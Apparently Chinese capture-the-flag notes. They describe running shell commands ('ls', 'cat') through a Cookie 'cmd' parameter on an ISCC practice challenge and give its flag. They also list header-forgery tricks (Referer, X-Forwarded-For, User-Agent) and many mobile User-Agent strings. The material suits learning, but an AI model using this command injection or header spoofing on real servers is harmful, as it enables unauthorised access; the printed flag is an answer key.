#修改请求方式，命令执行来得到flag
	我们经常把WEB服务搭建在linux服务器上，可是王老师告诉我们要逆其道而行之。 http://script.iscc.org.cn/script04
	正常访问返回： Let's capture flag in this level.
	响应头里看到一个
	hint cmd
	发现不管是post cmd还是get cmd都返回Do you wanna something else? 猜测他的cmd是REQUEST接受的 所以尝试了下Cookie提交
	cmd=ls
	返回
	98ed9baeb613a0f5 ed9b.php index.php
	然后，改成
	cat 98ed9baeb613a0f5 flag:{559baa94ce76a540e62f86a77bbe4f6c}
#基础篇
1.直接查看源代码
http://lab1.xseclab.com/base1_4a4d993ed7bd7d467b27af52d2aaa800/index.php
有些贱人也有可能吧flag藏到css或js里。
2.修改或添加HTTP请求头
	常见的有：
	Referer:来源伪造
	X-Forwarded-For：ip伪造
	User-Agent：用户代理（就是用什么浏览器什么的）
		Android：

		Android 0.*: 
		Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522 (KHTML, like Gecko) Safari/419.3

		Android 1.*: 
		Mozilla/5.0 (Linux; U; Android 1.0; en-us; dream) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2 
		Mozilla/5.0 (Linux; U; Android 1.1; en-gb; dream) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2 
		Mozilla/5.0 (Linux; U; Android 1.5; de-de; Galaxy Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; en-us; sdk Build/CUPCAKE) AppleWebkit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; en-us; htc_bahamas Build/CRB17) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; de-ch; HTC Hero Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; de-de; HTC Magic Build/PLAT-RC33) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 FirePHP/0.3 
		Mozilla/5.0 (Linux; U; Android 1.5; en-us; T-Mobile G1 Build/CRB43) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari 525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; en-gb; T-Mobile_G2_Touch Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; en-us; SPH-M900 Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; fr-fr; GT-I5700 Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.5; ja-jp; GDDJ-09 Build/CDB56) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; en-us; HTC_TATTOO_A3288 Build/DRC79) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; es-es; SonyEricssonX10i Build/R1FA016) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; en-us; SonyEricssonX10i Build/R1AA056) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; ja-jp; IS01 Build/S3082) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; ja-jp; IS01 Build/SA180) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; ja-jp; Docomo HT-03A Build/DRD08) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; ja-jp; SonyEricssonSO-01B Build/R1EA029) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		Mozilla/5.0 (Linux; U; Android 1.6; ja-jp; generic Build/Donut) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1 
		HTC_Dream Mozilla/5.0 (Linux; U; Android 1.5; en-ca; Build/CUPCAKE) AppleWebKit/528.5 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1

		Android 2.*: 
		Mozilla/5.0 (Linux; U; Android 2.0; en-us; Droid Build/ESD20) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 
		Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 
		Mozilla/5.0 (Linux; U; Android 2.0.1; de-de; Milestone Build/SHOLS_U2_01.14.0) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 
		Mozilla/5.0 (Linux; U; Android 2.1; en-us; Nexus One Build/ERD62) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 
		Mozilla/5.0 (Linux; U; Android 2.1-update1; de-de; HTC Desire 1.19.161.5 Build/ERE27) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 
		Mozilla/5.0 (Linux; U; Android 2.1; en-us; HTC Legend Build/cupcake) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 
		Mozilla/5.0 (Linux; U; Android 2.1-update1; ja-jp; SonyEricssonSO-01B Build/2.0.2.B.0.29) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17 
		Mozilla/5.0 (Linux; U; Android 2.2; en-ca; GT-P1000M Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2; en-us; Nexus One Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2; en-us; ADR6300 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2; en-us; T-Mobile HTC_G2 Build/FRF91) Gecko/20110415 Firefox/4.0.2pre Fennec/4.0.1 
		Mozilla/5.0 (Android 2.2; zh-cn; HTC Desire)/GoBrowser 
		Mozilla/5.0 (Linux; U; Android 2.2.1; ja-jp; Full Android Build/MASTER) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2.1; ja-jp; IS03 Build/S9090) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Android 2.2.2; Linux; Opera Mobi/ADR-1103311355; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00 
		Mozilla/4.0 (compatible; MSIE 8.0; Android 2.2.2; Linux; Opera Mobi/ADR-1103311355; en) Opera 11.00 
		Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9 
		Mozilla/5.0 (Linux; U; Android 2.3.3; ja-jp; SC-02C Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; ja-jp; INFOBAR A01 Build/S9081) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; ja-jp; 001HT Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; ja-jp; SonyEricssonX10i Build/3.0.1.G.0.75) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari 
		Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile 
		Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; BNTV250 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.4; ja-jp; SonyEricssonIS11S Build/4.0.1.B.0.112) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.4; ja-jp; IS05 Build/S9290) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.5; ja-jp; F-05D Build/F0001) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.5; ja-jp; T-01D Build/F0001) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/24.838; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/24.741; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (Android 2.2;;; Linux; Opera Mobi/ADR-1012291359; U; en) Presto/2.7.60 Version/10.5 
		Opera/9.80 (Android 2.2; Opera Mobi/ADR-2093533608; U; pl) Presto/2.7.60 Version/10.5 
		Opera/9.80 (Android 2.2; Opera Mobi/-2118645896; U; pl) Presto/2.7.60 Version/10.5 
		Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533312; U; pl) Presto/2.7.60 Version/10.5 
		Opera/9.80 (Android 2.2; Linux; Opera Mobi/ADR-2093533120; U; pl) Presto/2.7.60 Version/10.5 
		Opera/9.80 (Android 2.2; Linux; Opera Mobi/8745; U; en) Presto/2.7.60 Version/10.5 
		Opera/9.80 (Android 2.2.1; Linux; Opera Mobi/ADR-1107051709; U; pl) Presto/2.8.149 Version/11.10 
		Opera/9.80 (Android 2.3.3; Linux; Opera Mobi/ADR-1111101157; U; ja) Presto/2.9.201 Version/11.50 
		Opera/9.80 (Android 2.3.3; Linux; Opera Mobi/ADR-1111101157; U; es-ES) Presto/2.9.201 Version/11.50 
		Opera/9.80 (Android 2.3.4; Linux; Opera Mobi/build-1107180945; U; en-GB) Presto/2.8.149 Version/11.10

		Android 3.* 
		Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2 
		Mozilla/5.0 (Linux; U; Android 3.0.1; fr-fr; A500 Build/HRI66) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.0.1; en-us; GT-P7100 Build/HRI83) AppleWebkit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.0.1; ja-jp; MZ604 Build/H.6.2-20) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.1; en-us; K1 Build/HMJ37) AppleWebKit/534.13(KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.1; ja-jp; AT100 Build/HMJ37) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.1; ja-jp; Sony Tablet S Build/THMAS10000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.2; ja-jp; SC-01D Build/MASTER) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.2; ja-jp; AT1S0 Build/HTJ85B) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.2; ja-jp; F-01D Build/F0001) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.2; ja-jp; Sony Tablet S Build/THMAS11000) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Mozilla/5.0 (Linux; U; Android 3.2; ja-jp; A01SH Build/HTJ85B) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Safari/533.1 
		Mozilla/5.0 (Linux; U; Android 3.2.1; ja-jp; Transformer TF101 Build/HTK75) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13 
		Opera/9.80 (Android 3.2.1; Linux; Opera Tablet/ADR-1109081720; U; ja) Presto/2.8.149 Version/11.10

		Android 4.* 
		Mozilla/5.0 (Linux; U; Android 4.0.1; ja-jp; Galaxy Nexus Build/ITL41D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 
		Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 
		Mozilla/5.0 (Linux; U; Android 4.0.3; de-de; Galaxy S II Build/GRJ22) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 
		Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 
		Mozilla/5.0 (Linux; U; Android 4.1.1; ja-jp; Galaxy Nexus Build/JRO03H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 
		Opera/9.80 (Android 4.0.4; Linux; Opera Mobi/ADR-1205181138; U; pl) Presto/2.10.254 Version/12.00 
		Opera/12.02 (Android 4.1; Linux; Opera Mobi/ADR-1111101157; U; en-US) Presto/2.9.201 Version/12.02


		Windows Phone OS:

		Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0; Nokia;N70) 
		Mozilla/4.0 (compatible; MSIE 7.0; Windows Phone OS 7.0; Trident/3.1; IEMobile/7.0) Asus;Galaxy6 
		Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0; FujitsuToshibaMobileCommun; IS12T; KDDI)


		BlackBerry:

		BlackBerry7100i/4.1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/103 
		BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12 (Google WAP Proxy/1.0) 
		BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100 
		BlackBerry8330/4.3.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/105 
		BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0 
		BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 
		BlackBerry9000/4.6.0.294 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/220 
		BlackBerry9300/5.0.0.1007 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/220 
		BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0 
		BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123 
		BlackBerry9700/5.0.0.1014 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/220 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; ja) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.570 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9780; ja) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.587 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; pt) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.546 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko) 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.22296; BlackBerry9800; U; AppleWebKit/23.370; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry 9800) AppleWebKit/24.783; U; es) Presto/2.5.25 Version/10.54 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.1 (KHTML, Like Gecko) Version/6.0.0.141 Mobile Safari/534.1 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; tr) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; fr) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; it) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.668 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-GB) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; zh-TW) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; zh-TW) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.466 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.450 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.446 Mobile Safari/534.8+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.201 Mobile Safari/534.1+ 
		Opera/9.80 (J2ME/MIDP; Opera Mini/4.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/24.705; U; en) Presto/2.5.25 Version/10.54 
		Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (BlackBerry; U; BlackBerry9800; en-GB) AppleWebKit/24.783; U; en) Presto/2.5.25 Version/10.54 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.115 Mobile Safari/534.11+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9860; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; ja) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.74 Mobile Safari/534.11+ 
		Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+


		SymbianOS:

		SymbianOS 3.*: 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC6-01/011.010; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.2 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaC7-00/012.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE7-00/010.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.7.3 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/013.016; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.8.10 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/014.002; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.4 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaE6-00/021.002; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.16 Mobile Safari/533.4 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaX7-00/021.004; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.21 Mobile Safari/533.4 3gpp-gba 
		Mozilla/5.0 (Symbian/3; Series60/5.3 Nokia701/111.020.0307; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.4.1.14 Mobile Safari/533.4 3gpp-gba 
		SonyEricssonP910c/R2A SEMC-Browser/Symbian/3.0 Profile/MIDP-2.0 Configuration/CLDC-1.0

		SymbianOS 6.*: 
		Nokia3650/1.0 SymbianOS/6.1 Series60/1.1 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia3650/1.0 SymbianOS/6.1 Series60/1.2 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia7650/1.0 SymbianOS/6.1 Series60/0.9 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		NokiaN-GageQD/1.0 SymbianOS/6.1 Series60/1.2 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		NokiaN-Gage/1.0 (4.03) SymbianOS/6.1 Series60/0.9 Profile/MIDP-1.0 Configuration/CLDC-1.0 
		Nokia6600/1.0 (4.03.24) SymbianOS/6.1 Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3660/1.0 (4.59) SymbianOS/6.1 Series60/0.9 Profile/MIDP-1.0 Configuration/CLDC-1.0 UP.Link/1.1

		SymbianOS 7.*: 
		Nokia6600/1.0 (5.27.0) SymbianOS/7.0s Seri 
		Nokia3100/1.0 (3.38.0) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6600/1.0 (3.38.0) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6600/1.0 (3.42.1) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6600/1.0 (4.04.0) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6600/1.0 (5.27.0) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia6600/1.0 (5.53.0) SymbianOS/7.0s Series60/2.0 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3230/2.0 (5.0614.0) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3230/2.0 (3.0510.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3230/2.0 (3.0512.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3230/2.0 (3.0515.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3230/2.0 (4.0526.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3230/2.0 (4.0526.2ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
		Nokia3230/2.0 (4.0537.0ch) SymbianOS/7.0s Series60/2.1 Profile/MIDP-2.0 Configuration/CLDC-1.0 
